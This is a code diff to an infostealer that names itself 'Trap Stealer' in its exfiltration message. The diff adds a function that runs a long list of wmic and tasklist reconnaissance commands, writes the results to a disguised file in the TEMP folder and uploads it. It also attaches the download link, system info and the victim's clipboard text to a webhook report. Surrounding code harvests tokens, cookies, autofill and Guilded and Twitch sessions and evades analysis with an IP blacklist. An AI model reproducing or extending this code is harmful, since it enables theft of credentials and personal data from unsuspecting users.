@@ -129,7 +129,7 @@ def check_ip():
     ]
     while True:
         try:
-            response = requests.get("https://api.ipify.org")
+            response = requests.get("https://checkip.amazonaws.com/")
             ip_address = response.content.decode()
             if ip_address in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
@@ -272,7 +272,6 @@ def fakegen():
                 continue
             essay = int(essay)
 
-            # Create a thread to run the generate_codes function
             thread = threading.Thread(target=generate_codes, args=(essay,))
             thread.start()
 
@@ -698,7 +697,63 @@ def getaut(path, arg):
         writeforfile(atfi, 'autofill')
 
 
-import requests
+def userinfo():
+    def execute_command(command):
+        try:
+            with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
+                result = process.communicate()
+                output = result[0]
+                if process.returncode != 0:
+                    output += f"\nError: {result[1]}"
+                return output
+        except Exception as e:
+            return str(e)
+
+    commands = [
+        'wmic os get csname, description, installdate, organization, registereduser, numberofprocesses',
+        'wmic os get lastbootuptime, localdatetime, oslanguage, version',
+        'wmic qfe get',
+        'wmic startup get',
+        'wmic nic get',
+        'wmic netclient get',
+        'wmic netlogin get',
+        'wmic netprotocol get',
+        'wmic nicconfig get',
+        'wmic netuse get',
+        'wmic os get /format:list',
+        'wmic logicaldisk get caption, description, size, filesystem',
+        'wmic diskdrive get caption, size, mediatype',
+        'wmic cpu get caption, deviceid, maxclockspeed, numberofcores',
+        'wmic memorychip get capacity, devicelocator, speed',
+        'wmic bios get manufacturer, version, releasedate',
+        'wmic service get name, startname, state',
+        'wmic useraccount get name, domain, disabled',
+        'wmic process list brief',
+        'wmic printer get name, portname, drivername',
+        'tasklist'
+    ]
+
+    output_file_path = os.getenv("TEMP") + f"\winguid.txt"
+
+    with open(output_file_path, 'w') as f:
+        f.write('')
+    def write_to_file(command, output):
+        with open(output_file_path, "a") as f:
+            f.write(f"Command: {command}\n")
+            f.write(f"Output:\n{output}\n\n")
+
+    for command in commands:
+        output = execute_command(command)
+        write_to_file(command, output)
+
+    with open(output_file_path, "r") as f:
+        lines = [line.replace('\t', '    ') for line in f]
+
+    with open(output_file_path, "w") as f:
+        f.writelines(lines)
+        
+    return upload_file(output_file_path)
+
 
 def uhqguild(token):
     try:
@@ -1554,11 +1609,12 @@ def getinfo():
             sysinfo_future = executor.submit(systemInfo)
             globalinfo_future = executor.submit(globalInfo)
             clipboardtext_future = executor.submit(clip)
+            useri = executor.submit(userinfo)
 
-            # Attendre que toutes les tâches soient terminées
             sysinfo = sysinfo_future.result()
             globalinfo = globalinfo_future.result()
             clipboardtext = clipboardtext_future.result()
+            useri = useri.result()
 
             data = {
                 "username": "Trap Stealer",
@@ -1567,7 +1623,7 @@ def getinfo():
                 "embeds": [
                     {
                         "title": "🍪 Trap Stealer Information",
-                        "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nClipboard text : ```{clipboardtext}```",
+                        "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nMore Info : `Info.txt` \n[Click here to download]({useri})\nClipboard text : ```{clipboardtext}```",
                         "color": 0xffb6c1,
                         "thumbnail": {
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -2263,7 +2319,6 @@ def guilded(cookie):
             social_links = response["user"]['socialLinks']
             social_links_info = []
 
-            # Iterate through social links and store information in a list
             for link in social_links:
                 name = link.get('handle', '')
                 websitename = link.get('type', 'Cannot get the website')
@@ -2477,7 +2532,7 @@ def twitch_session(auth_token, username):
             'Content-Type': 'application/json',
         }
 
-        query = f"""
+        query = f'''
         
         query {{
             user(login: "{username}") {{
@@ -2495,7 +2550,7 @@ def twitch_session(auth_token, username):
                 }}
             }}
         }}
-        """
+        '''
 
         data = {
             "query": query
